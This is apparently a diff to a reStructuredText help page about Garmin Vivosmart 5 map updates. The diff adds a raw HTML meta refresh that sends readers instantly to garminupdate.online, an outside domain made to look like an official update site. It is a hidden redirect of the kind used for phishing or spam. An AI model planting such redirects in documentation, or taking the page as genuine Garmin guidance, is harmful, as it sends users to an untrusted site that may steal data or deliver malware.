@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Vivosmart 5 Map Update: What You Need to Know About Navigation and GPS
 ==========================================================
 
